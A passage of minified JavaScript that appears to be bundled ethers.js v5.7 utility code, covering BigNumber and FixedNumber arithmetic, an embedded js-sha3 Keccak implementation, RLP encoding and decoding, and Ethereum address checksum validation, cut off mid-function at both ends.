Ke.from(e).isZero()&&Ss("division-by-zero","div"),$i(Zt(this).div(Zt(e)))}mul(e){return $i(Zt(this).mul(Zt(e)))}mod(e){const t=Zt(e);return t.isNeg()&&Ss("division-by-zero","mod"),$i(Zt(this).umod(t))}pow(e){const t=Zt(e);return t.isNeg()&&Ss("negative-power","pow"),$i(Zt(this).pow(t))}and(e){const t=Zt(e);return(this.isNegative()||t.isNeg())&&Ss("unbound-bitwise-result","and"),$i(Zt(this).and(t))}or(e){const t=Zt(e);return(this.isNegative()||t.isNeg())&&Ss("unbound-bitwise-result","or"),$i(Zt(this).or(t))}xor(e){const t=Zt(e);return(this.isNegative()||t.isNeg())&&Ss("unbound-bitwise-result","xor"),$i(Zt(this).xor(t))}mask(e){return(this.isNegative()||e<0)&&Ss("negative-width","mask"),$i(Zt(this).maskn(e))}shl(e){return(this.isNegative()||e<0)&&Ss("negative-width","shl"),$i(Zt(this).shln(e))}shr(e){return(this.isNegative()||e<0)&&Ss("negative-width","shr"),$i(Zt(this).shrn(e))}eq(e){return Zt(this).eq(Zt(e))}lt(e){return Zt(this).lt(Zt(e))}lte(e){return Zt(this).lte(Zt(e))}gt(e){return Zt(this).gt(Zt(e))}gte(e){return Zt(this).gte(Zt(e))}isNegative(){return"-"===this._hex[0]}isZero(){return Zt(this).isZero()}toNumber(){try{return Zt(this).toNumber()}catch{Ss("overflow","toNumber",this.toString())}return null}toBigInt(){try{return BigInt(this.toString())}catch{}return Ta.throwError("this platform does not support BigInt",we.errors.UNSUPPORTED_OPERATION,{value:this.toString()})}toString(){return arguments.length>0&&(10===arguments[0]?c8||(c8=!0,Ta.warn("BigNumber.toString does not accept any parameters; base-10 is assumed")):16===arguments[0]?Ta.throwError("BigNumber.toString does not accept any parameters; use bigNumber.toHexString()",we.errors.UNEXPECTED_ARGUMENT,{}):Ta.throwError("BigNumber.toString does not accept parameters",we.errors.UNEXPECTED_ARGUMENT,{})),Zt(this).toString(10)}toHexString(){return this._hex}toJSON(e){return{type:"BigNumber",hex:this.toHexString()}}static from(e){if(e instanceof Ke)return e;if("string"==typeof e)return e.match(/^-?0x[0-9a-f]+$/i)?new Ke(qw,u0(e)):e.match(/^-?[0-9]+$/)?new Ke(qw,u0(new Ug(e))):Ta.throwArgumentError("invalid BigNumber string","value",e);if("number"==typeof e)return e%1&&Ss("underflow","BigNumber.from",e),(e>=a8||e<=-a8)&&Ss("overflow","BigNumber.from",e),Ke.from(String(e));const t=e;if("bigint"==typeof t)return Ke.from(t.toString());if(uh(t))return Ke.from(kt(t));if(t)if(t.toHexString){const e=t.toHexString();if("string"==typeof e)return Ke.from(e)}else{let e=t._hex;if(null==e&&"BigNumber"===t.type&&(e=t.hex),"string"==typeof e&&(Nr(e)||"-"===e[0]&&Nr(e.substring(1))))return Ke.from(e)}return Ta.throwArgumentError("invalid BigNumber value","value",e)}static isBigNumber(e){return!(!e||!e._isBigNumber)}}function u0(e){if("string"!=typeof e)return u0(e.toString(16));if("-"===e[0])return"-"===(e=e.substring(1))[0]&&Ta.throwArgumentError("invalid hex","value",e),"0x00"===(e=u0(e))?e:"-"+e;if("0x"!==e.substring(0,2)&&(e="0x"+e),"0x"===e)return"0x00";for(e.length%2&&(e="0x0"+e.substring(2));e.length>4&&"0x00"===e.substring(0,4);)e="0x"+e.substring(4);return e}function $i(e){return Ke.from(u0(e))}function Zt(e){const t=Ke.from(e).toHexString();return"-"===t[0]?new Ug("-"+t.substring(3),16):new Ug(t.substring(2),16)}function Ss(e,t,r){const n={fault:e,operation:t};return null!=r&&(n.value=r),Ta.throwError(e,we.errors.NUMERIC_FAULT,n)}function pY(e){return new Ug(e,36).toString(16)}const yi=new we(HI),Pd={},qI=Ke.from(0),VI=Ke.from(-1);function GI(e,t,r,n){const i={fault:t,operation:r};return void 0!==n&&(i.value=n),yi.throwError(e,we.errors.NUMERIC_FAULT,i)}let Md="0";for(;Md.length<256;)Md+=Md;function f_(e){if("number"!=typeof e)try{e=Ke.from(e).toNumber()}catch{}return"number"==typeof e&&e>=0&&e<=256&&!(e%1)?"1"+Md.substring(0,e):yi.throwArgumentError("invalid decimal size","decimals",e)}function eg(e,t){null==t&&(t=0);const r=f_(t),n=(e=Ke.from(e)).lt(qI);n&&(e=e.mul(VI));let i=e.mod(r).toString();for(;i.length<r.length-1;)i="0"+i;i=i.match(/^([0-9]*[1-9]|0)(0*)/)[1];const o=e.div(r).toString();return e=1===r.length?o:o+"."+i,n&&(e="-"+e),e}function Ia(e,t){null==t&&(t=0);const r=f_(t);("string"!=typeof e||!e.match(/^-?[0-9.]+$/))&&yi.throwArgumentError("invalid decimal value","value",e);const n="-"===e.substring(0,1);n&&(e=e.substring(1)),"."===e&&yi.throwArgumentError("missing value","value",e);const i=e.split(".");i.length>2&&yi.throwArgumentError("too many decimal points","value",e);let o=i[0],s=i[1];for(o||(o="0"),s||(s="0");"0"===s[s.length-1];)s=s.substring(0,s.length-1);for(s.length>r.length-1&&GI("fractional component exceeds decimals","underflow","parseFixed"),""===s&&(s="0");s.length<r.length-1;)s+="0";const a=Ke.from(o),c=Ke.from(s);let l=a.mul(r).add(c);return n&&(l=l.mul(VI)),l}class ff{constructor(e,t,r,n){e!==Pd&&yi.throwError("cannot use FixedFormat constructor; use FixedFormat.from",we.errors.UNSUPPORTED_OPERATION,{operation:"new FixedFormat"}),this.signed=t,this.width=r,this.decimals=n,this.name=(t?"":"u")+"fixed"+String(r)+"x"+String(n),this._multiplier=f_(n),Object.freeze(this)}static from(e){if(e instanceof ff)return e;"number"==typeof e&&(e=`fixed128x${e}`);let t=!0,r=128,n=18;if("string"==typeof e){if("fixed"!==e)if("ufixed"===e)t=!1;else{const i=e.match(/^(u?)fixed([0-9]+)x([0-9]+)$/);i||yi.throwArgumentError("invalid fixed format","format",e),t="u"!==i[1],r=parseInt(i[2]),n=parseInt(i[3])}}else if(e){const i=(t,r,n)=>null==e[t]?n:(typeof e[t]!==r&&yi.throwArgumentError("invalid fixed format ("+t+" not "+r+")","format."+t,e[t]),e[t]);t=i("signed","boolean",t),r=i("width","number",r),n=i("decimals","number",n)}return r%8&&yi.throwArgumentError("invalid fixed format width (not byte aligned)","format.width",r),n>80&&yi.throwArgumentError("invalid fixed format (decimals too large)","format.decimals",n),new ff(Pd,t,r,n)}}class Bn{constructor(e,t,r,n){e!==Pd&&yi.throwError("cannot use FixedNumber constructor; use FixedNumber.from",we.errors.UNSUPPORTED_OPERATION,{operation:"new FixedFormat"}),this.format=n,this._hex=t,this._value=r,this._isFixedNumber=!0,Object.freeze(this)}_checkFormat(e){this.format.name!==e.format.name&&yi.throwArgumentError("incompatible format; use fixedNumber.toFormat","other",e)}addUnsafe(e){this._checkFormat(e);const t=Ia(this._value,this.format.decimals),r=Ia(e._value,e.format.decimals);return Bn.fromValue(t.add(r),this.format.decimals,this.format)}subUnsafe(e){this._checkFormat(e);const t=Ia(this._value,this.format.decimals),r=Ia(e._value,e.format.decimals);return Bn.fromValue(t.sub(r),this.format.decimals,this.format)}mulUnsafe(e){this._checkFormat(e);const t=Ia(this._value,this.format.decimals),r=Ia(e._value,e.format.decimals);return Bn.fromValue(t.mul(r).div(this.format._multiplier),this.format.decimals,this.format)}divUnsafe(e){this._checkFormat(e);const t=Ia(this._value,this.format.decimals),r=Ia(e._value,e.format.decimals);return Bn.fromValue(t.mul(this.format._multiplier).div(r),this.format.decimals,this.format)}floor(){const e=this.toString().split(".");1===e.length&&e.push("0");let t=Bn.from(e[0],this.format);const r=!e[1].match(/^(0*)$/);return this.isNegative()&&r&&(t=t.subUnsafe(l8.toFormat(t.format))),t}ceiling(){const e=this.toString().split(".");1===e.length&&e.push("0");let t=Bn.from(e[0],this.format);const r=!e[1].match(/^(0*)$/);return!this.isNegative()&&r&&(t=t.addUnsafe(l8.toFormat(t.format))),t}round(e){null==e&&(e=0);const t=this.toString().split(".");if(1===t.length&&t.push("0"),(e<0||e>80||e%1)&&yi.throwArgumentError("invalid decimal count","decimals",e),t[1].length<=e)return this;const r=Bn.from("1"+Md.substring(0,e),this.format),n=gY.toFormat(this.format);return this.mulUnsafe(r).addUnsafe(n).floor().divUnsafe(r)}isZero(){return"0.0"===this._value||"0"===this._value}isNegative(){return"-"===this._value[0]}toString(){return this._value}toHexString(e){if(null==e)return this._hex;e%8&&yi.throwArgumentError("invalid byte width","width",e);return Jr(Ke.from(this._hex).fromTwos(this.format.width).toTwos(e).toHexString(),e/8)}toUnsafeFloat(){return parseFloat(this.toString())}toFormat(e){return Bn.fromString(this._value,e)}static fromValue(e,t,r){return null==r&&null!=t&&!dY(t)&&(r=t,t=null),null==t&&(t=0),null==r&&(r="fixed"),Bn.fromString(eg(e,t),ff.from(r))}static fromString(e,t){null==t&&(t="fixed");const r=ff.from(t),n=Ia(e,r.decimals);!r.signed&&n.lt(qI)&&GI("unsigned value cannot be negative","overflow","value",e);let i=null;r.signed?i=n.toTwos(r.width).toHexString():(i=n.toHexString(),i=Jr(i,r.width/8));const o=eg(n,r.decimals);return new Bn(Pd,i,o,r)}static fromBytes(e,t){null==t&&(t="fixed");const r=ff.from(t);if(Lt(e).length>r.width/8)throw new Error("overflow");let n=Ke.from(e);r.signed&&(n=n.fromTwos(r.width));const i=n.toTwos((r.signed?0:1)+r.width).toHexString(),o=eg(n,r.decimals);return new Bn(Pd,i,o,r)}static from(e,t){if("string"==typeof e)return Bn.fromString(e,t);if(uh(e))return Bn.fromBytes(e,t);try{return Bn.fromValue(e,0,t)}catch(e){if(e.code!==we.errors.INVALID_ARGUMENT)throw e}return yi.throwArgumentError("invalid FixedNumber value","value",e)}static isFixedNumber(e){return!(!e||!e._isFixedNumber)}}const l8=Bn.from(1),gY=Bn.from("0.5"),vY="properties/5.7.0";var mY=globalThis&&globalThis.__awaiter||function(e,t,r,n){return new(r||(r=Promise))((function(i,o){function s(e){try{c(n.next(e))}catch(e){o(e)}}function a(e){try{c(n.throw(e))}catch(e){o(e)}}function c(e){e.done?i(e.value):function(e){return e instanceof r?e:new r((function(t){t(e)}))}(e.value).then(s,a)}c((n=n.apply(e,t||[])).next())}))};const Wg=new we(vY);function _t(e,t,r){Object.defineProperty(e,t,{enumerable:!0,value:r,writable:!1})}function Ec(e,t){for(let r=0;r<32;r++){if(e[t])return e[t];if(!e.prototype||"object"!=typeof e.prototype)break;e=Object.getPrototypeOf(e.prototype).constructor}return null}function Fn(e){return mY(this,void 0,void 0,(function*(){const t=Object.keys(e).map((t=>{const r=e[t];return Promise.resolve(r).then((e=>({key:t,value:e})))}));return(yield Promise.all(t)).reduce(((e,t)=>(e[t.key]=t.value,e)),{})}))}function bY(e,t){(!e||"object"!=typeof e)&&Wg.throwArgumentError("invalid object","object",e),Object.keys(e).forEach((r=>{t[r]||Wg.throwArgumentError("invalid object key - "+r,"transaction:"+r,e)}))}function Wi(e){const t={};for(const r in e)t[r]=e[r];return t}const wY={bigint:!0,boolean:!0,function:!0,number:!0,string:!0};function KI(e){if(null==e||wY[typeof e])return!0;if(Array.isArray(e)||"object"==typeof e){if(!Object.isFrozen(e))return!1;const t=Object.keys(e);for(let r=0;r<t.length;r++){let n=null;try{n=e[t[r]]}catch{continue}if(!KI(n))return!1}return!0}return Wg.throwArgumentError("Cannot deepCopy "+typeof e,"object",e)}function yY(e){if(KI(e))return e;if(Array.isArray(e))return Object.freeze(e.map((e=>Gl(e))));if("object"==typeof e){const t={};for(const r in e){const n=e[r];void 0!==n&&_t(t,r,Gl(n))}return t}return Wg.throwArgumentError("Cannot deepCopy "+typeof e,"object",e)}function Gl(e){return yY(e)}class _Y{constructor(e){for(const t in e)this[t]=Gl(e[t])}}var JI={exports:{}};
/**
 * [js-sha3]{@link https://github.com/emn178/js-sha3}
 *
 * @version 0.8.0
 * @author Chen, Yi-Cyuan [emn178@gmail.com]
 * @copyright Chen, Yi-Cyuan 2015-2018
 * @license MIT
 */!function(e){!function(){var t="input is invalid type",r="object"==typeof window,n=r?window:{};n.JS_SHA3_NO_WINDOW&&(r=!1);var i=!r&&"object"==typeof self;!n.JS_SHA3_NO_NODE_JS&&"object"==typeof process&&process.versions&&process.versions.node?n=Ue:i&&(n=self);var o=!n.JS_SHA3_NO_COMMON_JS&&e.exports,s=!n.JS_SHA3_NO_ARRAY_BUFFER&&typeof ArrayBuffer<"u",a="0123456789abcdef".split(""),c=[4,1024,262144,67108864],l=[0,8,16,24],u=[1,0,32898,0,32906,2147483648,2147516416,2147483648,32907,0,2147483649,0,2147516545,2147483648,32777,2147483648,138,0,136,0,2147516425,0,2147483658,0,2147516555,0,139,2147483648,32905,2147483648,32771,2147483648,32770,2147483648,128,2147483648,32778,0,2147483658,2147483648,2147516545,2147483648,32896,2147483648,2147483649,0,2147516424,2147483648],h=[224,256,384,512],d=[128,256],f=["hex","buffer","arrayBuffer","array","digest"],p={128:168,256:136};(n.JS_SHA3_NO_NODE_JS||!Array.isArray)&&(Array.isArray=function(e){return"[object Array]"===Object.prototype.toString.call(e)}),s&&(n.JS_SHA3_NO_ARRAY_BUFFER_IS_VIEW||!ArrayBuffer.isView)&&(ArrayBuffer.isView=function(e){return"object"==typeof e&&e.buffer&&e.buffer.constructor===ArrayBuffer});for(var g=function(e,t,r){return function(n){return new R(e,t,e).update(n)[r]()}},m=function(e,t,r){return function(n,i){return new R(e,t,i).update(n)[r]()}},v=function(e,t,r){return function(t,n,i,o){return E["cshake"+e].update(t,n,i,o)[r]()}},y=function(e,t,r){return function(t,n,i,o){return E["kmac"+e].update(t,n,i,o)[r]()}},b=function(e,t,r,n){for(var i=0;i<f.length;++i){var o=f[i];e[o]=t(r,n,o)}return e},w=function(e,t){var r=g(e,t,"hex");return r.create=function(){return new R(e,t,e)},r.update=function(e){return r.create().update(e)},b(r,g,e,t)},_=[{name:"keccak",padding:[1,256,65536,16777216],bits:h,createMethod:w},{name:"sha3",padding:[6,1536,393216,100663296],bits:h,createMethod:w},{name:"shake",padding:[31,7936,2031616,520093696],bits:d,createMethod:function(e,t){var r=m(e,t,"hex");return r.create=function(r){return new R(e,t,r)},r.update=function(e,t){return r.create(t).update(e)},b(r,m,e,t)}},{name:"cshake",padding:c,bits:d,createMethod:function(e,t){var r=p[e],n=v(e,0,"hex");return n.create=function(n,i,o){return i||o?new R(e,t,n).bytepad([i,o],r):E["shake"+e].create(n)},n.update=function(e,t,r,i){return n.create(t,r,i).update(e)},b(n,v,e,t)}},{name:"kmac",padding:c,bits:d,createMethod:function(e,t){var r=p[e],n=y(e,0,"hex");return n.create=function(n,i,o){return new T(e,t,i).bytepad(["KMAC",o],r).bytepad([n],r)},n.update=function(e,t,r,i){return n.create(e,r,i).update(t)},b(n,y,e,t)}}],E={},x=[],S=0;S<_.length;++S)for(var A=_[S],C=A.bits,I=0;I<C.length;++I){var k=A.name+"_"+C[I];if(x.push(k),E[k]=A.createMethod(C[I],A.padding),"sha3"!==A.name){var N=A.name+C[I];x.push(N),E[N]=E[k]}}function R(e,t,r){this.blocks=[],this.s=[],this.padding=t,this.outputBits=r,this.reset=!0,this.finalized=!1,this.block=0,this.start=0,this.blockCount=1600-(e<<1)>>5,this.byteCount=this.blockCount<<2,this.outputBlocks=r>>5,this.extraBytes=(31&r)>>3;for(var n=0;n<50;++n)this.s[n]=0}function T(e,t,r){R.call(this,e,t,r)}R.prototype.update=function(e){if(this.finalized)throw new Error("finalize already called");var r,n=typeof e;if("string"!==n){if("object"!==n)throw new Error(t);if(null===e)throw new Error(t);if(s&&e.constructor===ArrayBuffer)e=new Uint8Array(e);else if(!(Array.isArray(e)||s&&ArrayBuffer.isView(e)))throw new Error(t);r=!0}for(var i,o,a=this.blocks,c=this.byteCount,u=e.length,h=this.blockCount,d=0,f=this.s;d<u;){if(this.reset)for(this.reset=!1,a[0]=this.block,i=1;i<h+1;++i)a[i]=0;if(r)for(i=this.start;d<u&&i<c;++d)a[i>>2]|=e[d]<<l[3&i++];else for(i=this.start;d<u&&i<c;++d)(o=e.charCodeAt(d))<128?a[i>>2]|=o<<l[3&i++]:o<2048?(a[i>>2]|=(192|o>>6)<<l[3&i++],a[i>>2]|=(128|63&o)<<l[3&i++]):o<55296||o>=57344?(a[i>>2]|=(224|o>>12)<<l[3&i++],a[i>>2]|=(128|o>>6&63)<<l[3&i++],a[i>>2]|=(128|63&o)<<l[3&i++]):(o=65536+((1023&o)<<10|1023&e.charCodeAt(++d)),a[i>>2]|=(240|o>>18)<<l[3&i++],a[i>>2]|=(128|o>>12&63)<<l[3&i++],a[i>>2]|=(128|o>>6&63)<<l[3&i++],a[i>>2]|=(128|63&o)<<l[3&i++]);if(this.lastByteIndex=i,i>=c){for(this.start=i-c,this.block=a[h],i=0;i<h;++i)f[i]^=a[i];O(f),this.reset=!0}else this.start=i}return this},R.prototype.encode=function(e,t){var r=255&e,n=1,i=[r];for(r=255&(e>>=8);r>0;)i.unshift(r),r=255&(e>>=8),++n;return t?i.push(n):i.unshift(n),this.update(i),i.length},R.prototype.encodeString=function(e){var r,n=typeof e;if("string"!==n){if("object"!==n)throw new Error(t);if(null===e)throw new Error(t);if(s&&e.constructor===ArrayBuffer)e=new Uint8Array(e);else if(!(Array.isArray(e)||s&&ArrayBuffer.isView(e)))throw new Error(t);r=!0}var i=0,o=e.length;if(r)i=o;else for(var a=0;a<e.length;++a){var c=e.charCodeAt(a);c<128?i+=1:c<2048?i+=2:c<55296||c>=57344?i+=3:(c=65536+((1023&c)<<10|1023&e.charCodeAt(++a)),i+=4)}return i+=this.encode(8*i),this.update(e),i},R.prototype.bytepad=function(e,t){for(var r=this.encode(t),n=0;n<e.length;++n)r+=this.encodeString(e[n]);var i=t-r%t,o=[];return o.length=i,this.update(o),this},R.prototype.finalize=function(){if(!this.finalized){this.finalized=!0;var e=this.blocks,t=this.lastByteIndex,r=this.blockCount,n=this.s;if(e[t>>2]|=this.padding[3&t],this.lastByteIndex===this.byteCount)for(e[0]=e[r],t=1;t<r+1;++t)e[t]=0;for(e[r-1]|=2147483648,t=0;t<r;++t)n[t]^=e[t];O(n)}},R.prototype.toString=R.prototype.hex=function(){this.finalize();for(var e,t=this.blockCount,r=this.s,n=this.outputBlocks,i=this.extraBytes,o=0,s=0,c="";s<n;){for(o=0;o<t&&s<n;++o,++s)e=r[o],c+=a[e>>4&15]+a[15&e]+a[e>>12&15]+a[e>>8&15]+a[e>>20&15]+a[e>>16&15]+a[e>>28&15]+a[e>>24&15];s%t==0&&(O(r),o=0)}return i&&(e=r[o],c+=a[e>>4&15]+a[15&e],i>1&&(c+=a[e>>12&15]+a[e>>8&15]),i>2&&(c+=a[e>>20&15]+a[e>>16&15])),c},R.prototype.arrayBuffer=function(){this.finalize();var e,t=this.blockCount,r=this.s,n=this.outputBlocks,i=this.extraBytes,o=0,s=0,a=this.outputBits>>3;e=i?new ArrayBuffer(n+1<<2):new ArrayBuffer(a);for(var c=new Uint32Array(e);s<n;){for(o=0;o<t&&s<n;++o,++s)c[s]=r[o];s%t==0&&O(r)}return i&&(c[o]=r[o],e=e.slice(0,a)),e},R.prototype.buffer=R.prototype.arrayBuffer,R.prototype.digest=R.prototype.array=function(){this.finalize();for(var e,t,r=this.blockCount,n=this.s,i=this.outputBlocks,o=this.extraBytes,s=0,a=0,c=[];a<i;){for(s=0;s<r&&a<i;++s,++a)e=a<<2,t=n[s],c[e]=255&t,c[e+1]=t>>8&255,c[e+2]=t>>16&255,c[e+3]=t>>24&255;a%r==0&&O(n)}return o&&(e=a<<2,t=n[s],c[e]=255&t,o>1&&(c[e+1]=t>>8&255),o>2&&(c[e+2]=t>>16&255)),c},T.prototype=new R,T.prototype.finalize=function(){return this.encode(this.outputBits,!0),R.prototype.finalize.call(this)};var O=function(e){var t,r,n,i,o,s,a,c,l,h,d,f,p,g,m,v,y,b,w,_,E,x,S,A,C,I,k,N,R,T,O,P,M,j,L,D,B,U,$,z,F,H,q,W,V,G,K,Z,Y,J,Q,X,ee,te,re,ne,ie,oe,se,ae,ce,le,ue;for(n=0;n<48;n+=2)i=e[0]^e[10]^e[20]^e[30]^e[40],o=e[1]^e[11]^e[21]^e[31]^e[41],s=e[2]^e[12]^e[22]^e[32]^e[42],a=e[3]^e[13]^e[23]^e[33]^e[43],c=e[4]^e[14]^e[24]^e[34]^e[44],l=e[5]^e[15]^e[25]^e[35]^e[45],h=e[6]^e[16]^e[26]^e[36]^e[46],d=e[7]^e[17]^e[27]^e[37]^e[47],t=(f=e[8]^e[18]^e[28]^e[38]^e[48])^(s<<1|a>>>31),r=(p=e[9]^e[19]^e[29]^e[39]^e[49])^(a<<1|s>>>31),e[0]^=t,e[1]^=r,e[10]^=t,e[11]^=r,e[20]^=t,e[21]^=r,e[30]^=t,e[31]^=r,e[40]^=t,e[41]^=r,t=i^(c<<1|l>>>31),r=o^(l<<1|c>>>31),e[2]^=t,e[3]^=r,e[12]^=t,e[13]^=r,e[22]^=t,e[23]^=r,e[32]^=t,e[33]^=r,e[42]^=t,e[43]^=r,t=s^(h<<1|d>>>31),r=a^(d<<1|h>>>31),e[4]^=t,e[5]^=r,e[14]^=t,e[15]^=r,e[24]^=t,e[25]^=r,e[34]^=t,e[35]^=r,e[44]^=t,e[45]^=r,t=c^(f<<1|p>>>31),r=l^(p<<1|f>>>31),e[6]^=t,e[7]^=r,e[16]^=t,e[17]^=r,e[26]^=t,e[27]^=r,e[36]^=t,e[37]^=r,e[46]^=t,e[47]^=r,t=h^(i<<1|o>>>31),r=d^(o<<1|i>>>31),e[8]^=t,e[9]^=r,e[18]^=t,e[19]^=r,e[28]^=t,e[29]^=r,e[38]^=t,e[39]^=r,e[48]^=t,e[49]^=r,g=e[0],m=e[1],G=e[11]<<4|e[10]>>>28,K=e[10]<<4|e[11]>>>28,N=e[20]<<3|e[21]>>>29,R=e[21]<<3|e[20]>>>29,ae=e[31]<<9|e[30]>>>23,ce=e[30]<<9|e[31]>>>23,H=e[40]<<18|e[41]>>>14,q=e[41]<<18|e[40]>>>14,j=e[2]<<1|e[3]>>>31,L=e[3]<<1|e[2]>>>31,v=e[13]<<12|e[12]>>>20,y=e[12]<<12|e[13]>>>20,Z=e[22]<<10|e[23]>>>22,Y=e[23]<<10|e[22]>>>22,T=e[33]<<13|e[32]>>>19,O=e[32]<<13|e[33]>>>19,le=e[42]<<2|e[43]>>>30,ue=e[43]<<2|e[42]>>>30,te=e[5]<<30|e[4]>>>2,re=e[4]<<30|e[5]>>>2,D=e[14]<<6|e[15]>>>26,B=e[15]<<6|e[14]>>>26,b=e[25]<<11|e[24]>>>21,w=e[24]<<11|e[25]>>>21,J=e[34]<<15|e[35]>>>17,Q=e[35]<<15|e[34]>>>17,P=e[45]<<29|e[44]>>>3,M=e[44]<<29|e[45]>>>3,A=e[6]<<28|e[7]>>>4,C=e[7]<<28|e[6]>>>4,ne=e[17]<<23|e[16]>>>9,ie=e[16]<<23|e[17]>>>9,U=e[26]<<25|e[27]>>>7,$=e[27]<<25|e[26]>>>7,_=e[36]<<21|e[37]>>>11,E=e[37]<<21|e[36]>>>11,X=e[47]<<24|e[46]>>>8,ee=e[46]<<24|e[47]>>>8,W=e[8]<<27|e[9]>>>5,V=e[9]<<27|e[8]>>>5,I=e[18]<<20|e[19]>>>12,k=e[19]<<20|e[18]>>>12,oe=e[29]<<7|e[28]>>>25,se=e[28]<<7|e[29]>>>25,z=e[38]<<8|e[39]>>>24,F=e[39]<<8|e[38]>>>24,x=e[48]<<14|e[49]>>>18,S=e[49]<<14|e[48]>>>18,e[0]=g^~v&b,e[1]=m^~y&w,e[10]=A^~I&N,e[11]=C^~k&R,e[20]=j^~D&U,e[21]=L^~B&$,e[30]=W^~G&Z,e[31]=V^~K&Y,e[40]=te^~ne&oe,e[41]=re^~ie&se,e[2]=v^~b&_,e[3]=y^~w&E,e[12]=I^~N&T,e[13]=k^~R&O,e[22]=D^~U&z,e[23]=B^~$&F,e[32]=G^~Z&J,e[33]=K^~Y&Q,e[42]=ne^~oe&ae,e[43]=ie^~se&ce,e[4]=b^~_&x,e[5]=w^~E&S,e[14]=N^~T&P,e[15]=R^~O&M,e[24]=U^~z&H,e[25]=$^~F&q,e[34]=Z^~J&X,e[35]=Y^~Q&ee,e[44]=oe^~ae&le,e[45]=se^~ce&ue,e[6]=_^~x&g,e[7]=E^~S&m,e[16]=T^~P&A,e[17]=O^~M&C,e[26]=z^~H&j,e[27]=F^~q&L,e[36]=J^~X&W,e[37]=Q^~ee&V,e[46]=ae^~le&te,e[47]=ce^~ue&re,e[8]=x^~g&v,e[9]=S^~m&y,e[18]=P^~A&I,e[19]=M^~C&k,e[28]=H^~j&D,e[29]=q^~L&B,e[38]=X^~W&G,e[39]=ee^~V&K,e[48]=le^~te&ne,e[49]=ue^~re&ie,e[0]^=u[n],e[1]^=u[n+1]};if(o)e.exports=E;else for(S=0;S<x.length;++S)n[x[S]]=E[x[S]]}()}(JI);var EY=JI.exports;const xY=tu(EY);function Un(e){return"0x"+xY.keccak_256(Lt(e))}const SY="rlp/5.7.0",Fo=new we(SY);function u8(e){const t=[];for(;e;)t.unshift(255&e),e>>=8;return t}function f8(e,t,r){let n=0;for(let i=0;i<r;i++)n=256*n+e[t+i];return n}function ZI(e){if(Array.isArray(e)){let t=[];if(e.forEach((function(e){t=t.concat(ZI(e))})),t.length<=55)return t.unshift(192+t.length),t;const r=u8(t.length);return r.unshift(247+r.length),r.concat(t)}l_(e)||Fo.throwArgumentError("RLP object must be BytesLike","object",e);const t=Array.prototype.slice.call(Lt(e));if(1===t.length&&t[0]<=127)return t;if(t.length<=55)return t.unshift(128+t.length),t;const r=u8(t.length);return r.unshift(183+r.length),r.concat(t)}function Fv(e){return kt(ZI(e))}function h8(e,t,r,n){const i=[];for(;r<t+1+n;){const o=QI(e,r);i.push(o.result),(r+=o.consumed)>t+1+n&&Fo.throwError("child data too short",we.errors.BUFFER_OVERRUN,{})}return{consumed:1+n,result:i}}function QI(e,t){if(0===e.length&&Fo.throwError("data too short",we.errors.BUFFER_OVERRUN,{}),e[t]>=248){const r=e[t]-247;t+1+r>e.length&&Fo.throwError("data short segment too short",we.errors.BUFFER_OVERRUN,{});const n=f8(e,t+1,r);return t+1+r+n>e.length&&Fo.throwError("data long segment too short",we.errors.BUFFER_OVERRUN,{}),h8(e,t,t+1+r,r+n)}if(e[t]>=192){const r=e[t]-192;return t+1+r>e.length&&Fo.throwError("data array too short",we.errors.BUFFER_OVERRUN,{}),h8(e,t,t+1,r)}if(e[t]>=184){const r=e[t]-183;t+1+r>e.length&&Fo.throwError("data array too short",we.errors.BUFFER_OVERRUN,{});const n=f8(e,t+1,r);t+1+r+n>e.length&&Fo.throwError("data array too short",we.errors.BUFFER_OVERRUN,{});return{consumed:1+r+n,result:kt(e.slice(t+1+r,t+1+r+n))}}if(e[t]>=128){const r=e[t]-128;t+1+r>e.length&&Fo.throwError("data too short",we.errors.BUFFER_OVERRUN,{});return{consumed:1+r,result:kt(e.slice(t+1,t+1+r))}}return{consumed:1,result:kt(e[t])}}function h_(e){const t=Lt(e),r=QI(t,0);return r.consumed!==t.length&&Fo.throwArgumentError("invalid rlp data","data",e),r.result}const CY="address/5.7.0",ef=new we(CY);function d8(e){Nr(e,20)||ef.throwArgumentError("invalid address","address",e);const t=(e=e.toLowerCase()).substring(2).split(""),r=new Uint8Array(40);for(let e=0;e<40;e++)r[e]=t[e].charCodeAt(0);const n=Lt(Un(r));for(let e=0;e<40;e+=2)n[e>>1]>>4>=8&&(t[e]=t[e].toUpperCase()),(15&n[e>>1])>=8&&(t[e+1]=t[e+1].toUpperCase());return"0x"+t.join("")}const AY=9007199254740991;function IY(e){return Math.log10?Math.log10(e):Math.log(e)/Math.LN10}const d_={};for(let e=0;e<10;e++)d_[String(e)]=String(e);for(let e=0;e<26;e++)d_[String.fromCharCode(65+e)]=String(10+e);const p8=Math.floor(IY(AY));function RY(e){let t=(e=(e=e.toUpperCase()).substring(4)+e.substring(0,2)+"00").split("").map((e=>d_[e])).join("");for(;t.length>=p8;){let e=t.substring(0,p8);t=parseInt(e,10)%97+t.substring(e.length)}let r=String(98-parseInt(t,10)%97);for(;r.length<2;)r="0"+r;return r}function bo(e){let t=null;if("string"!=typeof e&&ef.throwArgumentError("invalid address","address",e),e.match(/^(0x)?[0-9a-fA-F]{40}$/))"0x"!==e.substring(0,2)&&(e="0x"+e),t=d8(e),e.match(/([A-F].*[a-f])|([a-f].*[A-F])/)&&t!==e&&ef.throwArgumentError("bad address checksum","address",e);else if(e.match(/^XE[0-9]{2}[0-9A-Za-z]{30,31}$/)){for(e.substring(2,4)!==RY(e)&&ef.throwArgumentError("bad icap checksum","address",e),t=pY(e.substring(4));t.length<40;)t="0"+t;t=d8("0x"+t)}else ef.throwArgumentError("invalid address","address",e);return t}function TY(e){let t=null;try{t=bo(e.from)}catch{ef.throwArgumentError("missing from address","transaction",e)}return bo(mi(Un(Fv([t,Df(Lt(Ke.from(e.nonce).toHexString()))])),12))}const NY="0x0000000000000000000000000000000000000000",OY=Ke.from(0),PY="0x0000000000000000000000000000000000000000000000000000000000000000",MY="strings/5.7.0",YI=new we(MY);var f0,ns;function kY(e,t,r,n,i){return YI.throwArgumentError(`invalid codepoint at offset ${t}; ${e}`,"bytes",r)}function XI(e,t,r,n,i){if(e===ns.BAD_PREFIX||e===ns.UNEXPECTED_CONTINUE){let e=0;for(let n=t+1;n<r.length&&r[n]>>6==2;n++)e++;return e}return e===ns.OVERRUN?r.length-t-1:0}function DY(e,t,r,n,i){return 